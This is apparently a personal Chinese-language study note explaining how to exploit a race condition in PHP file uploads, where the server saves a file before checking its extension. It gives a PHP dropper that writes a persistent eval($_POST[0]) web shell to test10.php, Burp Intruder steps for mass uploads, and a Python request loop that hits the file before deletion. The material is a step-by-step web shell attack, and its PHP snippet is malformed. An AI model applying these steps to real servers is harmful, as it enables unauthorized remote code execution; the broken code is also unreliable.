这是由于开发者设计应用程序并发处理时操作逻辑不合理造成的。当应用面临高并发的请求时未能同步所有的请求，导致请求之间产生等待时间逻辑错误。

## 判断
这种错误适用于我们先上传后判断的 php 逻辑，
如果我们先对文件进行保存，在判断后缀是否复合，如果不符合就删除，那么我们就可以多线程上传文件，同时一直访问上传的未见，使服务器来不及删除，达到写 shell 的目的。
![[Pasted image 20231127185240.png]]
## 流程 
1. 编写一个 php 脚本如下所示：
```php
file_put_contents('test10.php',<?php eval($_POST[0]);>?);
```

2. 把我们的脚本上传到网页后，一旦我们访问了，我们就可以一直写。
![[Pasted image 20231127185706.png]]

3. 用我们的 burp 去批量发送包
![[Pasted image 20231127185720.png]]

然后我们直接在 payloads 中设置我们的次数即可。
![[Pasted image 20231127185802.png]]

3. 我们发包后，我们用我们 python 来接受
```python
import requests
url="....../文件位置";
while(1):
	res=requests.get(url);
	print(res.status_code);
```

4. 我们不断运行后，我们会在我们的网站中创建一个 `test10.php` 的文件，我们可以通过直接访问这个文件